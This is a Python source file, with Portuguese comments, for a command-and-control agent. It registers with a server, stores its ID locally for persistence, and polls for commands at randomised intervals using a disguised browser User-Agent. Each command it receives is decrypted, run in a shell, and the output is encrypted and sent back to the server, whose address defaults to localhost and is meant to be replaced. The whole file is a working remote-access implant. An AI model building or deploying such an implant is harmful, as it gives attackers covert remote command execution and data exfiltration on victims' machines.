import requests
import time
import random
import subprocess
import os
from cryptography.fernet import Fernet

SERVER_URL = 'http://127.0.0.1:5000'  #Mude para o IP do servidor

key = os.getenv("C2_SHARED_KEY")
if not key:
    raise RuntimeError("C2_SHARED_KEY não definida")

fernet = Fernet(key.encode())

AGENT_FILE = ".agent_id"  # Persistência do agent_id

# Persistência: tenta ler ID salvo localmente
if os.path.exists(AGENT_FILE):
    with open(AGENT_FILE) as f:
        agent_id = f.read().strip()
        print(f"[+] Agente restaurado: {agent_id}")
else:
    r = requests.post(f"{SERVER_URL}/register")
    if r.status_code != 200:
        raise RuntimeError("Erro ao registrar no servidor.")
    agent_id = r.json()["agent_id"]
    with open(AGENT_FILE, "w") as f:
        f.write(agent_id)
    print(f"[+] Agente registrado: {agent_id}")

# Loop de polling
while True:
    #  Delay com aleatorização
    time.sleep(10 + random.randint(5, 15))

    headers = {
        "Agent-Id": agent_id,
        "User-Agent": "Mozilla/5.0",  # (opcional) Obfuscação básica
    }

    try:
        resp = requests.get(f"{SERVER_URL}/getcommand", headers=headers, timeout=5)
        if resp.status_code != 200:
            continue

        data = resp.json()
        if not data.get("command"):
            continue

        #Descriptografar comando
        cmd = fernet.decrypt(data["command"].encode()).decode()
        print(f"[+] Comando recebido: {cmd}")

        #Executar comando real
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()

        #Criptografar resultado
        enc_result = fernet.encrypt(result.encode()).decode()

        #Enviar resultado
        r = requests.post(
            f"{SERVER_URL}/submit_result",
            json={"result": enc_result},
            headers=headers,
            timeout=5
        )
        if r.status_code == 200:
            print("[+] Resultado enviado.")
        else:
            print("[!] Falha ao enviar resultado.")

    except Exception as e:
        print(f"[!] Erro: {e}")
        continue
